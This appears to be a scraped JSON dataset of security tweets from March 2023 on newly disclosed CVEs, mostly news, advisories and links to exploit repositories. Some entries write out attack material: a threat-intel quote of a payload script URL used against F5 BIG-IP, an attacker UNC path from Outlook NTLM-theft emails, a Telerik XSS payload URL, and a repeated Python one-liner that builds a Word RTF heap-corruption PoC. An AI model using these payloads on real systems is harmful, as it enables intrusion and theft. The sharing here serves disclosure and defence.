@@ -1,0 +1,486 @@
+{
+    "expanded_url": [
+        "http://github.com/projectdiscovery/nuclei-templates/releases/tag/v9.4.1"
+    ],
+    "tweetfavorites": 250,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 46,
+    "tweettext": "🚨 Nuclei-Templates v9.4.1 🚨\n\n🆕 69 templates, 7 contributors + 27 new CVEs including:\n\n💥 CVE-2023-28343: Command Injection\n💣 CVE-2023-28432: Information Disclosure\n💣 CVE-2022-1329: RCE Vulnerability\n\nFind out more here:\n👉 🔗 https://t.co/QrEohn9K6p https://t.co/OGDt0dr6a6",
+    "tweettime": "2023-03-30, 21:01:59",
+    "tweeturl": "https://twitter.com/pdnuclei/status/1641546334304976899",
+    "username": "pdnuclei"
+}
+{
+    "tweetfavorites": 34,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 14,
+    "tweettext": "⚠️ CVE-2020-5902 event detected ⚠️\n\nSource IP:\n45.128.232.181 (🇳🇱)\n\nPayload:\nhttp:// 192 . 161 . 55 . 115/ljc.sh\n\nTarget:\nF5 BIG-IP Traffic Management User Interface (TMUI) endpoints vulnerable to remote code execution.\n#threatintel",
+    "tweettime": "2023-03-29, 22:52:00",
+    "tweeturl": "https://twitter.com/bad_packets/status/1641211634805874688",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://viz.greynoise.io/tag/ibm-aspera-faspex-rce-attempt?days=30"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 12,
+    "tweettext": "Woke up to news of CVE-2022-47986, a remote code execution vulnerability in IBM Aspera Faspex, being used in ransomware.\n\nWe @GreyNoiseIO  been tracking it since mid February. https://t.co/SzIUueZSzJ\n\nSo I did this instead, happy Wednesday! https://t.co/Frsi5JkHmH",
+    "tweettime": "2023-03-29, 14:24:15",
+    "tweeturl": "https://twitter.com/_mattata/status/1641083856466984963",
+    "username": "_mattata"
+}
+{
+    "expanded_url": [
+        "https://ti.qianxin.com/blog/articles/Analysis-of-In-the-wild-Attack-Samples-Exploiting-Outlook-Privilege-Escalation-Vulnerability-(CVE-2023-23397)-EN/"
+    ],
+    "tweetfavorites": 42,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 21,
+    "tweettext": "Analysis about currently disclosed email samples exploiting #Outlook #CVE-2023-23397\n- Related attack dates back to March 2022\n- Ubiquiti EdgeRouter devices were used\n- Victims aren't limited to #Ukraine\n\nCheck out the report for more details:https://t.co/yx5nPtOarC https://t.co/FHdxBKwPtp",
+    "tweettime": "2023-03-29, 06:38:07",
+    "tweeturl": "https://twitter.com/RedDrip7/status/1640966547081662464",
+    "username": "RedDrip7"
+}
+{
+    "expanded_url": [
+        "https://www.securityweek.com/microsoft-no-interaction-outlook-zero-day-exploited-since-last-april/"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 21,
+    "tweettext": "“Microsoft has traced evidence of potential exploitation of this [Outlook no-interaction 0day] vulnerability as early as April 2022.\"\n\nCVE-2023-23397 hunting guidance - https://t.co/50Md5hF5Az",
+    "tweettime": "2023-03-27, 22:01:32",
+    "tweeturl": "https://twitter.com/ryanaraine/status/1640474157828931585",
+    "username": "ryanaraine"
+}
+{
+    "expanded_url": [
+        "https://www.virustotal.com/gui/file/ece085c17ac5e822b78c533366e725bc845e215dcda78c0502ebd7f33ccb06ed/details"
+    ],
+    "tweetfavorites": 158,
+    "tweetquotes": 5,
+    "tweetreplies": 4,
+    "tweetretweets": 70,
+    "tweettext": "#APT \nThe email that exploited #Outlook #CVE-2023-23397 in the wild was submitted to VT as early as on Apr 1st, 2022 and targeted State Migration Service of #Ukraine.\n\nFilename: \"2022-03-18 - лист.eml\"\nUNC Link: \\\\5[.]199.162.132\\SCW\n\nhttps://t.co/Pnc0bIRfxo https://t.co/ujlxchJNbf",
+    "tweettime": "2023-03-27, 13:16:36",
+    "tweeturl": "https://twitter.com/RedDrip7/status/1640342052327108609",
+    "username": "RedDrip7"
+}
+{
+    "expanded_url": [
+        "https://github.com/Acceis/exploit-CVE-2023-23752",
+        "https://t.me/hackgit/8006"
+    ],
+    "tweetfavorites": 210,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 75,
+    "tweettext": "CVE-2023-23752\n\nJoomla! &lt; 4.2.8 - Unauthenticated information disclosure.\n\nhttps://t.co/gTecXt1lbT\n\n#cve #exploit #cybersecurity #infosec https://t.co/DWOl3q2grb https://t.co/2tP549DpX7",
+    "tweettime": "2023-03-25, 08:08:47",
+    "tweeturl": "https://twitter.com/hack_git/status/1639539815812321280",
+    "username": "hack_git"
+}
+{
+    "expanded_url": [
+        "https://tecsecurity.io/blog/tp-link_ax1800",
+        "https://github.com/TecR0c/exploits/blob/main/CVE-2023-28760/CVE-2023-28760.py"
+    ],
+    "tweetfavorites": 132,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 57,
+    "tweettext": "🚨 Just disclosed CVE-2023-28760: a critical RCE vulnerability in TP-Link AX1800 Wi-Fi 6 Routers! Update your firmware ASAP!\n\n🔗 Blog post: https://t.co/XNwYBSQpED\n🔗 Exploit code: https://t.co/sAXL8F8BfQ",
+    "tweettime": "2023-03-24, 05:09:40",
+    "tweeturl": "https://twitter.com/TecR0c/status/1639132348573958144",
+    "username": "TecR0c"
+}
+{
+    "tweetfavorites": 45,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 13,
+    "tweettext": "Just a reminder that patches for PetitPotam (CVE-2021-36942) remove capabilities to coerce NTLM auth from an unauthenticated position, but they don't stop an attacker with credentials (user or computer account) from NTLM coercion.",
+    "tweettime": "2023-03-24, 00:42:50",
+    "tweeturl": "https://twitter.com/JimSycurity/status/1639065198119071745",
+    "username": "JimSycurity"
+}
+{
+    "expanded_url": [
+        "https://github.com/JacobEbben/CVE-2022-24716"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "CVE-2022-24716:  Unauthenticated users can leak the contents of files of the local system accessible to the web-server user, including `icingaweb2`.\n\nPoC Icinga Web 2 &lt;2.8.6, &lt;2.9.6, &lt;2.10\nhttps://t.co/R7DxDcQqMc https://t.co/qG02zc9e8t",
+    "tweettime": "2023-03-20, 08:32:44",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1637733902021189632",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://github.com/vu-ls/Crassus"
+    ],
+    "tweetfavorites": 109,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 21,
+    "tweettext": "Your reminder that finding Windows LPE vulnerabilities with Crassus is really REALLY easy.\nAdobe CVE-2023-26358 was found with it and also verified in probably less than 5 minutes total.\nhttps://t.co/TZ0kUJMceT\nI'll be talking about Crassus at #GRIMMCon 0x8 on May 18. https://t.co/USB4IMzyqn",
+    "tweettime": "2023-03-17, 13:49:04",
+    "tweeturl": "https://twitter.com/wdormann/status/1636726345110568960",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY"
+    ],
+    "tweetfavorites": 93,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 32,
+    "tweettext": "Finally :) exploit for CVE-2023-23397\n\nhttps://t.co/ynCFi5PXCn",
+    "tweettime": "2023-03-15, 17:41:44",
+    "tweeturl": "https://twitter.com/vxzeroknowledge/status/1636060122974679044",
+    "username": "vxzeroknowledge"
+}
+{
+    "tweetfavorites": 64,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 28,
+    "tweettext": "CVE-2023-23415    faille windows icmp remote code execution 🎉🤦‍♀️  Back to the 90's 😅 https://t.co/244eTu3Ptz",
+    "tweettime": "2023-03-15, 17:22:37",
+    "tweeturl": "https://twitter.com/aderumier/status/1636055312187772930",
+    "username": "aderumier"
+}
+{
+    "tweetfavorites": 84,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 43,
+    "tweettext": "⚠ CVE-2023-23397 active exploitation\n- Microsoft patched an Outlook zero-day\n- Exploited to steal NTLM hashes\n- Used to target European organizations\n- Leveraged since April 2022 by FancyBear/APT28 🇷🇺\n- Reported by CERT-UA 🇺🇦",
+    "tweettime": "2023-03-15, 15:58:30",
+    "tweeturl": "https://twitter.com/BushidoToken/status/1636034142717595650",
+    "username": "BushidoToken"
+}
+{
+    "tweetfavorites": 32,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 32,
+    "tweettext": "🔒First one (CVE-2023-23397) is a privilege escalation flaw in #Microsoft Outlook, which can be triggered by a specially crafted email.\n\nSecond actively exploited flaw (CVE-2023-24880) is a bypass flaw in Windows SmartScreen that can allow attackers to evade security protections.",
+    "tweettime": "2023-03-15, 05:36:06",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1635877511593697281",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-outlook-zero-day-used-by-russian-hackers-since-april-2022/"
+    ],
+    "tweetfavorites": 53,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 19,
+    "tweettext": "🌐 A gold mine for attackers, Outlook zero-day vulnerability (CVE-2023-23397) 🚨\n\nhttps://t.co/kAd89ju2Jd",
+    "tweettime": "2023-03-14, 20:30:13",
+    "tweeturl": "https://twitter.com/ido_cohen2/status/1635740133533122570",
+    "username": "ido_cohen2"
+}
+{
+    "expanded_url": [
+        "https://www.securityweek.com/microsoft-patch-tuesday-zero-day-attacks/"
+    ],
+    "tweetfavorites": 91,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 36,
+    "tweettext": "Patch Tuesday: Microsoft pushed out fixes for at least 80 Windows flaws and called special attention to CVE-2023-23397, a critical-severity issue in Microsoft Outlook that has been exploited in zero-day attacks\n\nStory: https://t.co/yeDy2JfLIx",
+    "tweettime": "2023-03-14, 18:33:55",
+    "tweeturl": "https://twitter.com/ryanaraine/status/1635710867395461120",
+    "username": "ryanaraine"
+}
+{
+    "expanded_url": [
+        "https://sysdig.com/blog/cve-2023-0210-linux-kernel-unauthenticated-remote-heap-overflow/"
+    ],
+    "tweetfavorites": 260,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 104,
+    "tweettext": "Linux unauthenticated remote code execution in kernel context (CVE-2023-0210 affecting KSMBD)\nCVE analysis writeup by @sysdig\n\nhttps://t.co/1eKncHlLx7\n\n#Linux #kernel #exploit #infosec #cybersecurity https://t.co/6wc4TuZRoX",
+    "tweettime": "2023-03-14, 12:15:09",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1635615545838952449",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/03/fortinet-fortios-flaw-exploited-in.html"
+    ],
+    "tweetfavorites": 53,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 44,
+    "tweettext": "#Fortinet researchers have discovered an advanced and highly targeted threat actor that is exploiting a zero-day security #vulnerability (CVE-2022-41328) in FortiOS. This flaw could potentially result in the execution of arbitrary code.\n\nLearn more: https://t.co/RVO93rE8Ht\n\n#tech",
+    "tweettime": "2023-03-14, 06:02:08",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1635521673217597440",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 84,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 25,
+    "tweettext": "We took a look at the #Veeam CVE-2023-27532 noise, and @calebjstewart crafted a PoC for the unauthenticated credential dump -- and a little Remote Code Execution💥😎\n\nHuge thanks to @codewhitesec for raising the flag on this. Go patch! Patch your potatoes!",
+    "tweettime": "2023-03-13, 20:49:47",
+    "tweeturl": "https://twitter.com/_JohnHammond/status/1635382671256985600",
+    "username": "_JohnHammond"
+}
+{
+    "expanded_url": [
+        "https://hubs.ly/Q01GFNNJ0"
+    ],
+    "tweetfavorites": 60,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 18,
+    "tweettext": "We dug into the latest Veeam Backup &amp; Replication vulnerability, CVE-2023-27532. Our researchers crafted a proof-of-concept exploit to dump credentials as an unauthenticated user and pushed it further to achieve arbitrary code execution. Read all about it: https://t.co/tQFPnkV8ux https://t.co/7gsTddZagX",
+    "tweettime": "2023-03-13, 20:36:28",
+    "tweeturl": "https://twitter.com/HuntressLabs/status/1635379321836564482",
+    "username": "HuntressLabs"
+}
+{
+    "tweetfavorites": 92,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 21,
+    "tweettext": "I just wrote my first exploit for a real-world kernel vulnerability. It is about CVE-2022-24122. I did some cross-cache UAF attack to corrupt modprobe_path. You need to know the kernel base to prevent an oops during the exploit process. Reliability isn't great 😅 maybe like 5% https://t.co/OhZHjSBT7r",
+    "tweettime": "2023-03-12, 10:58:21",
+    "tweeturl": "https://twitter.com/BitFriends1/status/1634871445758042112",
+    "username": "BitFriends1"
+}
+{
+    "expanded_url": [
+        "https://httpd.apache.org/security/vulnerabilities_24.html#2.4.56"
+    ],
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 99,
+    "tweettext": "RT @PortSwiggerRes: Apache &lt;2.4.56 is vulnerable to request splitting in mod_rewrite and mod_proxy #CVE-2023-25690\nhttps://t.co/qRxf8GSpGR…",
+    "tweettime": "2023-03-10, 15:09:26",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1634209857510289411",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://github.com/xforcered/Windows_LPE_AFD_CVE-2023-21768"
+    ],
+    "tweetfavorites": 57,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "LPE #exploit for CVE-2023-21768 (#Windows Ancillary Function Driver for WinSock Elevation of Privilege #Vulnerability)\n\n// by @chompie1337 and @FuzzySec \n\nhttps://t.co/zJBaukSzQF",
+    "tweettime": "2023-03-10, 07:02:10",
+    "tweeturl": "https://twitter.com/0xdea/status/1634087233207648258",
+    "username": "0xdea"
+}
+{
+    "expanded_url": [
+        "https://github.com/xforcered/Windows_LPE_AFD_CVE-2023-21768"
+    ],
+    "tweetfavorites": 48,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 16,
+    "tweettext": "CVE-2023-21768 : Local Privilege Escalation PoC por @FuzzySec y @chompie1337\n\nEl exploit  funciona en sistemas Windows 11 22H2 \nhttps://t.co/ZA2Gh4mKLR",
+    "tweettime": "2023-03-09, 18:57:00",
+    "tweeturl": "https://twitter.com/elhackernet/status/1633904736117112845",
+    "username": "elhackernet"
+}
+{
+    "expanded_url": [
+        "https://jfrog.com/blog/openssh-pre-auth-double-free-cve-2023-25136-writeup-and-proof-of-concept/"
+    ],
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 42,
+    "tweettext": "RT @reverseame: OpenSSH Pre-Auth Double Free CVE-2023-25136 – Writeup and Proof-of-Concept https://t.co/4js3VpLK9o",
+    "tweettime": "2023-03-09, 17:37:00",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1633884603978006528",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768"
+    ],
+    "tweetfavorites": 31,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 14,
+    "tweettext": "GitHub - chompie1337/Windows_LPE_AFD_CVE-2023-21768: LPE exploit for CVE-2023-21768 - https://t.co/y3ZrUTEA5k",
+    "tweettime": "2023-03-09, 13:28:42",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1633822116759101441",
+    "username": "piedpiper1616"
+}
+{
+    "expanded_url": [
+        "https://github.com/xforcered/Windows_LPE_AFD_CVE-2023-21768"
+    ],
+    "tweetfavorites": 2001,
+    "tweetquotes": 18,
+    "tweetreplies": 34,
+    "tweetretweets": 599,
+    "tweettext": "Releasing a Windows 11 LPE exploit by @FuzzySec and I. Exploits CVE-2023-21768, a vuln in afd.sys. Blog post soon!\nhttps://t.co/iqQYsw5TmP https://t.co/8ypb4mZGtN",
+    "tweettime": "2023-03-08, 16:02:20",
+    "tweeturl": "https://twitter.com/chompie1337/status/1633498392125997056",
+    "username": "chompie1337"
+}
+{
+    "tweetfavorites": 360,
+    "tweetquotes": 4,
+    "tweetreplies": 5,
+    "tweetretweets": 190,
+    "tweettext": "¡Cuidado! 🛑 La nueva vulnerabilidad de Microsoft Office puede ejecutar código sin interacción del usuario 😱\n\nAl pasado fallo RCE que afecta productos microsoft denominado #Follina (CVE-2022-30190), se le suma un nuevo problema de seguridad para Microsoft Word relacionado 🧵👇 https://t.co/7ibwbL0V0h",
+    "tweettime": "2023-03-08, 15:28:09",
+    "tweeturl": "https://twitter.com/DragonJAR/status/1633489790594154496",
+    "username": "DragonJAR"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/03/cisas-kev-catalog-updated-with-3-new.html"
+    ],
+    "tweetfavorites": 51,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 28,
+    "tweettext": "CISA has added 3 more flaws to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation:\n\nCVE-2022-35914 - Teclib GLPI RCE\nCVE-2022-33891 - Apache Spark Command Injection\nCVE-2022-28810 - Zoho ADSelfService Plus RCE\n\nRead: https://t.co/37JzQHfQju",
+    "tweettime": "2023-03-08, 06:32:33",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1633355002478575618",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 265,
+    "tweetquotes": 2,
+    "tweetreplies": 12,
+    "tweetretweets": 51,
+    "tweettext": "Yes,I was awarded 500$ for Xss Due To CVE-2017-9140 \nhttps://Target/Telerik.ReportViewer.axd?optype=Parameters&amp;bgColor=_000000%22onload=%22prompt(1) https://t.co/3bWevJnKu2",
+    "tweettime": "2023-03-07, 15:32:45",
+    "tweeturl": "https://twitter.com/IsrewyMohand/status/1633128561467965440",
+    "username": "IsrewyMohand"
+}
+{
+    "expanded_url": [
+        "https://github.com/SIFalcon/Detection/blob/main/Yara/Hunting/HUNT_RTF_CVE_2023_21716.yar"
+    ],
+    "tweetfavorites": 70,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 24,
+    "tweettext": "🚨 #CVE-2023-21716 is a new criticial #RCE in Microsoft Word exploited through RTF documents. Similar, older exploits are still very popular with threat actors.\nWe tested the PoC created by @jduck and created a first prototype #yara hunting rule 🔍\nhttps://t.co/JFFoltTmTt\n1/2🧵 https://t.co/UjCz0YVZKA",
+    "tweettime": "2023-03-07, 14:38:36",
+    "tweeturl": "https://twitter.com/SI_FalconTeam/status/1633114934253965314",
+    "username": "SI_FalconTeam"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21716"
+    ],
+    "tweetfavorites": 61,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 26,
+    "tweettext": "⚠️ Critical Vulnerability in Microsoft Word .rtf file format was patched in February 2023.\nCVE-2023-21716 found by @jduck is a heap corruption #vulnerability that allows remote code execution!\nTriggered even in file explorer.\nA #PoC for demonstrating the https://t.co/ViR3JIcFGd… https://t.co/oNQf0QWXuP",
+    "tweettime": "2023-03-07, 13:56:56",
+    "tweeturl": "https://twitter.com/Gi7w0rm/status/1633104447168475138",
+    "username": "Gi7w0rm"
+}
+{
+    "expanded_url": [
+        "https://github.com/Nickguitar/Drag-and-Drop-Multiple-File-Uploader-PRO-Path-Traversal"
+    ],
+    "tweetfavorites": 134,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 40,
+    "tweettext": "CVE-2023-1112: Path Traversal in Drag and Drop Multiple File Uploader PRO - Contact Form 7 version 5.0.6.1 allows unauthenticated remote attacker to upload files anywhere writable on the remote server.\n\nPoC\n\nhttps://t.co/eKyUMyAqHN https://t.co/nDVz6OwIM9",
+    "tweettime": "2023-03-07, 09:29:10",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1633037060566130688",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://securityonline.info/poc-for-microsoft-word-rce-cve-2023-21716-published/"
+    ],
+    "tweetfavorites": 95,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "PoC for Microsoft Word RCE (CVE-2023-21716) Published https://t.co/mMk7CAVxox",
+    "tweettime": "2023-03-07, 04:59:03",
+    "tweeturl": "https://twitter.com/Dinosn/status/1632969086052315138",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://www.bleepingcomputer.com/news/security/proof-of-concept-released-for-critical-microsoft-word-rce-bug/"
+    ],
+    "tweetfavorites": 32,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 19,
+    "tweettext": "Microsoft Wordにおける遠隔コード実行脆弱性(CVE-2023-21716)の概念実証コード(PoC)が公開された。悪意あるRTF文書を開いた被害者の権限でコード実行が可能。PoCは脆弱性発見者のJoshua Drake氏によるもので、1ツイートに収まる長さまで短縮されている。 https://t.co/yvhbbFM77n",
+    "tweettime": "2023-03-06, 22:54:05",
+    "tweeturl": "https://twitter.com/__kokumoto/status/1632877236759183360",
+    "username": "__kokumoto"
+}
+{
+    "expanded_url": [
+        "https://www.helpnetsecurity.com/2023/03/06/cve-2023-21716-poc/"
+    ],
+    "tweetfavorites": 45,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 17,
+    "tweettext": "TL にポコポコ python の one liner が流れてきていたけどあれホンモノの PoC だったんだな。。。\n\nPoC exploit for recently patched Microsoft Word RCE is public (CVE-2023-21716) https://t.co/0BXpxIL1Ax",
+    "tweettime": "2023-03-06, 14:13:54",
+    "tweeturl": "https://twitter.com/strinsert1Na/status/1632746330350325760",
+    "username": "strinsert1Na"
+}
+{
+    "tweetfavorites": 357,
+    "tweetquotes": 3,
+    "tweetreplies": 8,
+    "tweetretweets": 93,
+    "tweettext": "CVE-2023-21716(Microsoft Word RCE vuln) Python PoC @momika233 \n\nopen(\"t3zt.rtf\",\"wb\").write((\"{\\\\rtf1{\\n{\\\\fonttbl\" + \"\".join([ (\"{\\\\f%dA;}\\n\" % i) for i in range(0,32761) ]) + \"}\\n{\\\\rtlch no crash??}\\n}}\\n\").encode('utf-8'))",
+    "tweettime": "2023-03-06, 11:53:48",
+    "tweeturl": "https://twitter.com/momika233/status/1632711072095387648",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 34,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 11,
+    "tweettext": "🤔CVE-2023-21716(Microsoft Word RCE vuln) Python PoC\nopen(\"t3zt.rtf\",\"wb\").write((\"{\\\\rtf1{\\n{\\\\fonttbl\" + \"\".join([ (\"{\\\\f%dA;}\\n\" % i) for i in range(0,32761) ]) + \"}\\n{\\\\rtlch no crash??}\\n}}\\n\").encode('utf-8'))",
+    "tweettime": "2023-03-05, 21:43:26",
+    "tweeturl": "https://twitter.com/akaclandestine/status/1632497070421471235",
+    "username": "akaclandestine"
+}
+{
+    "tweetfavorites": 877,
+    "tweetquotes": 25,
+    "tweetreplies": 19,
+    "tweetretweets": 262,
+    "tweettext": "CVE-2023-21716 Python PoC (take 2) open(\"t3zt.rtf\",\"wb\").write((\"{\\\\rtf1{\\n{\\\\fonttbl\" + \"\".join([ (\"{\\\\f%dA;}\\n\" % i) for i in range(0,32761) ]) + \"}\\n{\\\\rtlch no crash??}\\n}}\\n\").encode('utf-8'))",
+    "tweettime": "2023-03-05, 20:02:00",
+    "tweeturl": "https://twitter.com/jduck/status/1632471544935923712",
+    "username": "jduck"
+}
